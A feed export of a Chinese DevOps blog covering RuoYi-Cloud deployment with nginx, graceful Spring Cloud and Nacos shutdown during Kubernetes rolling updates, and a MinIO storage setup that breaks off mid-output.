class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local conf.d]# vim /etc/nginx/conf.d/ruoyi.conf <br>server &#123;<br>    listen       80;<br>    server_name  localhost;<br><br>        location / &#123;<br>            root   /usr/share/nginx/ruoyi-ui;<br>            try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /index.html;<br>            index  index.html index.htm;<br>        &#125;<br><br>        location /prod-api/&#123;<br>            proxy_set_header Host <span class="hljs-variable">$http_host</span>;<br>            proxy_set_header X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>            proxy_set_header REMOTE-HOST <span class="hljs-variable">$remote_addr</span>;<br>            proxy_set_header X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br>            proxy_pass http://localhost:8080/;<br>        &#125;<br><br>        <span class="hljs-comment"># 避免actuator暴露</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$request_uri</span> ~ <span class="hljs-string">&quot;/actuator&quot;</span>) &#123;<br>            <span class="hljs-built_in">return</span> 403;<br>        &#125;<br><br>    error_page   500 502 503 504  /50x.html;<br>    location = /50x.html &#123;<br>        root   html;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>创建目录拷贝&#x2F;dist目录下代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ruoyi-demo ruoyi-ui]# <span class="hljs-built_in">mkdir</span> /usr/share/nginx/ruoyi-ui<br>[root@ruoyi-demo ruoyi-ui]# <span class="hljs-built_in">cp</span> -r dist/* /usr/share/nginx/ruoyi-ui<br></code></pre></td></tr></table></figure><p>启动Nginx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local conf.d]# systemctl <span class="hljs-built_in">enable</span> nginx --now<br></code></pre></td></tr></table></figure><p>Windows配置本地解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\System32\drivers\etc\hosts<br>192.1.7.244 cherry.nuoyi.com<br></code></pre></td></tr></table></figure><p>访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">url：http://cherry.nuoyi.com/login?redirect=%2Findex<br>账号：admin<br>密码：admin123<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/2d6fcdae20cc4f3fa3a5f986251df64e.png" alt="在这里插入图片描述"></p><h1 id="五、更新特定模块"><a href="#五、更新特定模块" class="headerlink" title="五、更新特定模块"></a>五、更新特定模块</h1><p>更新ruoyi-auth模块，修改登录时的提示信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local RuoYi-Cloud-master]# vim /root/RuoYi-Cloud/ruoyi-auth/src/main/java/com/ruoyi/auth/service/SysLoginService.java<br><span class="hljs-comment">#...</span><br>        &#123;<br>            recordLogService.recordLogininfor(username, Constants.LOGIN_FAIL, <span class="hljs-string">&quot;登录用户不存在&quot;</span>);<br>            throw new ServiceException(<span class="hljs-string">&quot;输入的用户名：&quot;</span> + username + <span class="hljs-string">&quot; 不存在&quot;</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><p>重新打包ruoyi-auth模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">命令说明：<br>-pl//需要构建的目录<br>-am//同时构建该模块依赖的其他模块<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local RuoYi-Cloud-master]# <span class="hljs-built_in">cd</span> RuoYi-Cloud/<br>mvn package -Dmaven.test.skip=<span class="hljs-literal">true</span> -pl ruoyi-auth -am<br>===========================================================<br>[INFO] ruoyi .............................................. SUCCESS [  1.266 s]<br>[INFO] ruoyi-common ....................................... SUCCESS [  0.001 s]<br>[INFO] ruoyi-common-core .................................. SUCCESS [  1.962 s]<br>[INFO] ruoyi-api .......................................... SUCCESS [  0.001 s]<br>[INFO] ruoyi-api-system ................................... SUCCESS [  0.051 s]<br>[INFO] ruoyi-common-redis ................................. SUCCESS [  0.128 s]<br>[INFO] ruoyi-common-security .............................. SUCCESS [  0.056 s]<br>[INFO] ruoyi-auth ......................................... SUCCESS [  3.560 s]<br></code></pre></td></tr></table></figure><p><strong>提示：</strong>同一个项目中，如果其他服务依赖于被更新的服务， 那么在更新这个服务时，也会重新打包和部署那些相关的服务。</p><p>停止ruoyi-auth重新运行</p><p>jps命令是java的命令行工具，用于列出正在运行的Java进程信息 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local RuoYi-Cloud-master]# jps<br>315905 ruoyi-modules-system.jar<br>318947 Jps<br>212244 nacos-server.jar<br>303327 ruoyi-visual-monitor.jar<br>301785 ruoyi-gateway.jar<br>301082 ruoyi-auth.jar<br><br>[root@node1.local RuoYi-Cloud-master]# <span class="hljs-built_in">kill</span> 301082<br></code></pre></td></tr></table></figure><p>重新启动ruoyi-auth模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -Dspring.profiles.active=dev \<br>-Dspring.cloud.nacos.config.file-extension=yml \<br>-Dspring.cloud.nacos.discovery.server-addr=192.1.7.244:8848 \<br>-Dspring.cloud.nacos.config.server-addr=192.1.7.244:8848 \<br>-jar /root/RuoYi-Cloud/RuoYi-Cloud-master/ruoyi-auth/target/ruoyi-auth.jar &amp;&gt; /var/log/ruoyi-auth.log &amp;<br></code></pre></td></tr></table></figure><p>登录ruoyi页面，输入一个不存在的用户来验证更新结果<br><img src="https://gitee.com/ljh00928/csdn/raw/master/img/7593fcbf6cff4ce99620601c07370148.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>云原生</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring Cloud + Nacos + K8S 零影响发布方案Spring Cloud + Nacos + K8S 零影响发布方案</title>
    <link href="/2025/04/18/Spring-Cloud-Nacos-K8S-%E9%9B%B6%E5%BD%B1%E5%93%8D%E5%8F%91%E5%B8%83%E6%96%B9%E6%A1%88Spring-Cloud-Nacos-K8S-%E9%9B%B6%E5%BD%B1%E5%93%8D%E5%8F%91%E5%B8%83%E6%96%B9%E6%A1%88/"/>
    <url>/2025/04/18/Spring-Cloud-Nacos-K8S-%E9%9B%B6%E5%BD%B1%E5%93%8D%E5%8F%91%E5%B8%83%E6%96%B9%E6%A1%88Spring-Cloud-Nacos-K8S-%E9%9B%B6%E5%BD%B1%E5%93%8D%E5%8F%91%E5%B8%83%E6%96%B9%E6%A1%88/</url>
    
    <content type="html"><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>在生产环境中使用 springcloud 框架，由于服务更新过程中，容器服务会被直接停止，部分请求仍被分发到终止的容器，导致服务出现500错误，这部分错误请求数据占用比较少，因为Pod滚动更新都是一对一。因为部分用户会产生服务器错误的情况，考虑使用优雅的终止方式，将错误请求降到最低，直至滚动更新不影响用户。这里结合nacos使用来分析。</p><p>在 K8s 的滚动升级中，比如 5 个 Pod 服务在升级过程中，会先启动一半左右（比如：3 个新的启动），然后下线一部分服务……直到所有的旧服务被新服务完全替代，简单粗暴的理解滚动升级。如果我们不涉及 Nacos 还好，因为 K8s 会保证在升级过程中，因为负载的情况很有可能在升级过程中会一部分请求打到旧服务里，但是如果在旧服务准备关闭服务时，旧情求还没返回回去的话就会出现 HTTP 连接关闭情况等一些不可预测的意外发生，导致本次请求的业务失败，这是在生产上绝不能出现的事故。针对 K8s 的优雅关闭问题，我们可以继续往下看，下面会介绍 Nacos &amp; K8s 一个结合优雅关闭的方案。</p><p>我们来再谈谈 Nacos 在这里如果无优雅关闭的话会出现的情况，其实和 K8s 的本质很类似，假如我们已经解决了 K8s 的优雅关闭问题，那和 Nacos 之间又有什么联系呢？</p><p>我们可以想象下，还是举例上面的 5 个 Pod 的情景，在一个 Pod 启动时，服务的也自然会注册到 Nacos 上去，同理可得，在服务关闭时，Nacos 注册列表里服务也自然会被下线。那么类似的情况也会出现，如果说此时的情求打到旧服务上面，但是由于 Nacos 有监听时间（默认 30s）拉取一次最新情况，以及在每个 Pod 服务里本地也有一份缓存映射表（也有一个窗口时间更新），所以很有可能在这个窗口期之内，还有一些的旧的请求访问负载到旧服务里，但是这里会出现两种情况</p><p>K8s Pod 服务已下线，但是 Nacos 在窗口时间之内注册列表未更新，导致请求达到一个根本不存在的旧服务里 旧请求已经打到旧服务里，但是高峰期时，程序处理较慢，还没来及返回响应体，服务就被关闭了 以上这两种情况都会导致本次请求出现失败，生产上更是无语~ 所以我们针对 Nacos 的优雅关闭情况也会有一个解决方案，见“Nacos &amp; K8s 优雅关闭方案”</p><h1 id="一、思路"><a href="#一、思路" class="headerlink" title="一、思路"></a>一、思路</h1><p>为了解决这个问题, 我们将利用 springboot 的 graceful shutdown 功能和 nacos 的主动下线功能来解决这个问题. 具体思路如下:</p><p>1、让新的服务先启动起来，注册到注册中心，等待客户端发现新服务。</p><p>2、把待下线的服务从注册中心下线，等待客户端刷新服务列表。</p><p>3、把待下线的服务优雅停机。</p><h1 id="二、实现方式"><a href="#二、实现方式" class="headerlink" title="二、实现方式"></a>二、实现方式</h1><h2 id="1-创建从-nacos-中下线副本的API"><a href="#1-创建从-nacos-中下线副本的API" class="headerlink" title="1.创建从 nacos 中下线副本的API"></a><strong>1.创建从 nacos 中下线副本的API</strong></h2><p>我们通过创建自定义名为 <code>deregister</code> 的 <code>endpoint</code> 来通知 <code>nacos</code> 下线副本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.cloud.nacos.NacosDiscoveryProperties;<br><span class="hljs-keyword">import</span> com.alibaba.cloud.nacos.registry.NacosRegistration;<br><span class="hljs-keyword">import</span> com.alibaba.cloud.nacos.registry.NacosServiceRegistry;<br><span class="hljs-keyword">import</span> lombok.extern.log4j.Log4j2;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.boot.actuate.endpoint.annotation.Endpoint;<br><span class="hljs-keyword">import</span> org.springframework.boot.actuate.endpoint.annotation.ReadOperation;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@Endpoint(id = &quot;deregister&quot;)</span><br><span class="hljs-meta">@Log4j2</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LemesNacosServiceDeregisterEndpoint</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> NacosDiscoveryProperties nacosDiscoveryProperties;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> NacosRegistration nacosRegistration;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> NacosServiceRegistry nacosServiceRegistry;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 从 nacos 中主动下线，用于 k8s 滚动更新时，提前下线分流流量</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> com.lenovo.lemes.framework.core.util.ResultData&lt;java.lang.String&gt;</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@author</span> Yujie Yang</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@date</span> 4/6/22 2:57 PM</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ReadOperation</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">endpoint</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">serviceName</span> <span class="hljs-operator">=</span> nacosDiscoveryProperties.getService();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">groupName</span> <span class="hljs-operator">=</span> nacosDiscoveryProperties.getGroup();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">clusterName</span> <span class="hljs-operator">=</span> nacosDiscoveryProperties.getClusterName();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> nacosDiscoveryProperties.getIp();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> nacosDiscoveryProperties.getPort();<br><br>        log.info(<span class="hljs-string">&quot;deregister from nacos, serviceName:&#123;&#125;, groupName:&#123;&#125;, clusterName:&#123;&#125;, ip:&#123;&#125;, port:&#123;&#125;&quot;</span>, serviceName, groupName, clusterName, ip, port);<br><br>        <span class="hljs-comment">// 设置服务下线</span><br>        nacosServiceRegistry.setStatus(nacosRegistration, <span class="hljs-string">&quot;DOWN&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-支持-Graceful-Shutdown"><a href="#2-支持-Graceful-Shutdown" class="headerlink" title="2.支持 Graceful Shutdown"></a>2.支持 Graceful Shutdown</h2><p>Spring Boot 原生支持已经支持优雅停机。</p><p>我们需要添加下面的配置，超时需要根据平时请求的耗时来定，可以稍微大一点也没关系。我们只需要在 <code>bootstrap.yaml</code> 中添加一下配置即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">server:<br>  # 开启优雅下线<br>  shutdown: graceful<br><br>spring:<br>  lifecycle:<br>    # 优雅下线超时时间<br>    timeout-per-shutdown-phase: 5m<br># 暴露 shutdown 接口<br>management:<br>  endpoint:<br>    shutdown:<br>      enabled: <span class="hljs-literal">true</span><br>  endpoints:<br>    web:<br>      exposure:<br>        include: shutdown<br></code></pre></td></tr></table></figure><h2 id="3-配置K8s"><a href="#3-配置K8s" class="headerlink" title="3.配置K8s"></a>3.配置K8s</h2><p>有了上面两个 API, 接下来就配置到 k8s 上</p><p>1.K8S容器本身有一个就绪探针配置，当就绪探针返回正常，则开始删除旧POD。</p><p>2.terminationGracePeriodSeconds 如果关闭应用的时间超过 10 分钟, 则向容器发送 kill 信号, 防止应用长时间下线不了</p><p>terminationGracePeriodSeconds要大于preStop+spring.lifecycle.timeout-per-shutdown-phase，可以设置大一点没什么关系。</p><p>3.preStop 先执行下线操作, 等待30s, 留够通知到其他应用的时间, 然后执行 graceful shutdown 关闭应用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs bash">---<br>apiVersion: apps/v1<br>kind: Deployment<br>metadata:<br>  name: lemes-service-common<br>  labels:<br>    app: lemes-service-common<br>spec:<br>  replicas: 2<br>  selector:<br>    matchLabels:<br>      app: lemes-service-common<br><span class="hljs-comment">#  strategy:</span><br><span class="hljs-comment">#    type: RollingUpdate</span><br><span class="hljs-comment">#    rollingUpdate:</span><br><span class="hljs-comment">##     replicas - maxUnavailable &lt; running num  &lt; replicas + maxSurge</span><br><span class="hljs-comment">#      maxUnavailable: 1</span><br><span class="hljs-comment">#      maxSurge: 1</span><br>  template:<br>    metadata:<br>      labels:<br>        app: lemes-service-common<br>    spec:<br><span class="hljs-comment">#      容器重启策略 Never Always OnFailure</span><br><span class="hljs-comment">#      restartPolicy: Never</span><br><span class="hljs-comment">#     在pod优雅终止时，定义延迟发送kill信号的时间，此时间可用于pod处理完未处理的请求等状况。默认单位是秒</span><br><span class="hljs-comment">#     如果关闭时间超过10分钟， 则向容器发送kill信号</span><br>      terminationGracePeriodSeconds: 600<br>      affinity:<br>        podAntiAffinity:<br>          preferredDuringSchedulingIgnoredDuringExecution:<br>            - podAffinityTerm:<br>                topologyKey: <span class="hljs-string">&quot;kubernetes.io/hostname&quot;</span><br>                labelSelector:<br>                  matchExpressions:<br>                    - key: app<br>                      operator: In<br>                      values:<br>                        - lemes-service-common<br>              weight: 100<br><span class="hljs-comment">#          requiredDuringSchedulingIgnoredDuringExecution:</span><br><span class="hljs-comment">#            - labelSelector:</span><br><span class="hljs-comment">#                matchExpressions:</span><br><span class="hljs-comment">#                  - key: app</span><br><span class="hljs-comment">#                    operator: In</span><br><span class="hljs-comment">#                    values:</span><br><span class="hljs-comment">#                      - lemes-service-common</span><br><span class="hljs-comment">#              topologyKey: &quot;kubernetes.io/hostname&quot;</span><br>      volumes:<br>        - name: lemes-host-path<br>          hostPath:<br>            path: /data/logs<br>            <span class="hljs-built_in">type</span>: DirectoryOrCreate<br>        - name: sidecar<br>          emptyDir: &#123; &#125;<br>      containers:<br>        - name: lemes-service-common<br>          image: 10.176.66.20:5000/lemes-cloud/lemes-service-common-server:v0.1<br>          imagePullPolicy: Always<br>          volumeMounts:<br>            - name: lemes-host-path<br>              mountPath: /data/logs<br>            - name: sidecar<br>              mountPath: /sidecar<br>          ports:<br>            - containerPort: 80<br>          resources:<br><span class="hljs-comment">#           资源通常情况下的占用</span><br>            requests:<br>              memory: <span class="hljs-string">&#x27;2048Mi&#x27;</span><br><span class="hljs-comment">#           资源占用上限</span><br>            limits:<br>              memory: <span class="hljs-string">&#x27;4096Mi&#x27;</span><br>          livenessProbe:<br>            httpGet:<br><span class="hljs-comment">#             指定 Kubernetes 访问的健康检查 URL 路径</span><br>              path: /actuator/health/liveness<br>              port: 80<br>            initialDelaySeconds: 5<br><span class="hljs-comment">#           探针可以连续失败的次数</span><br>            failureThreshold: 10<br><span class="hljs-comment">#           探针超时时间</span><br>            timeoutSeconds: 10<br><span class="hljs-comment">#           多久执行一次探针查询</span><br>            periodSeconds: 10<br>          startupProbe:<br>            httpGet:<br>              path: /actuator/health/liveness<br>              port: 80<br>            failureThreshold: 30<br>            timeoutSeconds: 10<br>            periodSeconds: 10<br>          readinessProbe:<br>            httpGet:<br>              path: /actuator/health/readiness<br>              port: 80<br>            initialDelaySeconds: 5<br>            timeoutSeconds: 10<br>            periodSeconds: 10<br>          lifecycle:<br>            preStop:<br>              <span class="hljs-built_in">exec</span>:<br><span class="hljs-comment">#应用关闭操作：1. 从 nacos 下线，2. 等待30s, 保证 nacos 通知到其他应用 2.触发 springboot 的 graceful shutdown</span><br>                <span class="hljs-built_in">command</span>:<br>                  - sh<br>                  - -c<br>                  - curl http://127.0.0.1/actuator/deregister;<span class="hljs-built_in">sleep</span> 30;curl -X POST http://127.0.0.1/actuator/shutdown;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>云原生</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>k8s集成MinIo</title>
    <link href="/2025/04/18/k8s%E9%9B%86%E6%88%90MinIo/"/>
    <url>/2025/04/18/k8s%E9%9B%86%E6%88%90MinIo/</url>
    
    <content type="html"><![CDATA[<p> 本篇文章分享一下在 k8s怎么集成 minio做存储，并实现 <code>PersistentVolume (PV)</code>、<code>PersistentVolumeClaim (PVC)</code>、动态存储卷<code>StorageClass</code>，以及演示让pod使用这些存储卷的完整流程。</p><h1 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h1><h3 id="1、PV概念"><a href="#1、PV概念" class="headerlink" title="1、PV概念"></a>1、PV概念</h3><p>PV是对K8S存储资源的抽象，PV一般由运维人员创建和配置，供容器申请使用。</p><p>没有PV之前，服务器的磁盘没有分区的概念，有了PV之后，相当于通过PV对服务器的磁盘进行分区。</p><h3 id="2、PVC概念"><a href="#2、PVC概念" class="headerlink" title="2、PVC概念"></a>2、PVC概念</h3><p>PVC 是Pod对存储资源的一个申请，主要包括存储空间申请、访问模式等。创建PV后，Pod就可以通过PVC向PV申请磁盘空间了。类似于某个应用程序向<code>操作系统的D盘</code>申请1G的使用空间。</p><p>PVC 创建成功之后，Pod 就可以以存储卷（Volume）的方式使用 PVC 的存储资源了。Pod 在使用 PVC 时必须与PVC在同一个Namespace下。</p><h3 id="3、PV-PVC的关系"><a href="#3、PV-PVC的关系" class="headerlink" title="3、PV &#x2F; PVC的关系"></a>3、PV &#x2F; PVC的关系</h3><p>PV相当于对磁盘的分区，PVC相当于APP（应用程序）向某个分区申请多少空间。比如说安装WPS程序时，一般会告知我们安装它需要多少存储空间，让你选择在某个磁盘下安装。如果将来某个分区磁盘满了，也不会影响别的分区磁盘的使用。</p><p>一旦 PV 与PVC绑定，Pod就可以使用这个 PVC 了。如果在系统中没有满足 PVC 要求的 PV，PVC则一直处于 Pending 状态，直到系统里产生了一个合适的 PV。</p><h3 id="4、StorageClass概念"><a href="#4、StorageClass概念" class="headerlink" title="4、StorageClass概念"></a>4、StorageClass概念</h3><p>K8S有两种存储资源的供应模式：静态模式和动态模式，资源供应的最终目的就是将适合的PV与PVC绑定：</p><ul><li>静态模式：管理员预先创建许多各种各样的PV，等待PVC申请使用。</li><li>动态模式：管理员无须预先创建PV，而是通过StorageClass自动完成PV的创建以及与PVC的绑定。</li></ul><p>StorageClass就是动态模式，根据PVC的需求动态创建合适的PV资源，从而实现存储卷的按需创建。</p><p>一般某个商业性的应用程序，会用到大量的Pod，如果每个Pod都需要使用存储资源，那么就需要人工时不时的去创建PV，这也是个麻烦事儿。解决方法就是使用动态模式：当Pod通过PVC申请存储资源时，直接通过StorageClass去动态的创建对应大小的PV，然后与PVC绑定，所以基本上PV → PVC是一对一的关系。</p><h1 id="二、pod数据存储流程"><a href="#二、pod数据存储流程" class="headerlink" title="二、pod数据存储流程"></a>二、pod数据存储流程</h1><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/96f7b4369f9c4d3db6f70e391bd391fb.png" alt="img"></p><h1 id="三、部署minio"><a href="#三、部署minio" class="headerlink" title="三、部署minio"></a>三、部署minio</h1><p>官方文档：<a href="https://min.io/download?view=aistor-custom">MinIO | Code and downloads to create high performance object storage</a></p><p><strong>下载minio</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta"># 下载服务端</span><br>[root<span class="hljs-symbol">@minio</span> opt]<span class="hljs-meta"># wget https://dl.min.io/server/minio/release/linux-amd64/minio</span><br><span class="hljs-meta"># 将下载所得minio文件拷贝到指定文件夹并赋权</span><br>[root<span class="hljs-symbol">@minio</span> opt]<span class="hljs-meta"># cp minio /usr/local/bin/</span><br>[root<span class="hljs-symbol">@minio</span> opt]<span class="hljs-meta"># chmod +x /usr/local/bin/minio</span><br></code></pre></td></tr></table></figure><p><strong>为MinIO创建一个存储目录：</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@minio</span> opt]<span class="hljs-meta"># mkdir /data</span><br></code></pre></td></tr></table></figure><p><strong>启动MinIO，并指定存储目录和访问地址：</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[root@minio opt]# minio <span class="hljs-keyword">server</span> /data <span class="hljs-comment">--console-address &quot;:9099&quot;</span><br><span class="hljs-keyword">INFO</span>: Formatting <span class="hljs-number">1</span>st pool, <span class="hljs-number">1</span> <span class="hljs-keyword">set</span>(s), <span class="hljs-number">1</span> drives per <span class="hljs-keyword">set</span>.<br><span class="hljs-keyword">INFO</span>: <span class="hljs-built_in">WARNING</span>: Host <span class="hljs-keyword">local</span> has more than <span class="hljs-number">0</span> drives <span class="hljs-keyword">of</span> <span class="hljs-keyword">set</span>. A host failure will result <span class="hljs-keyword">in</span> data becoming unavailable.<br>MinIO 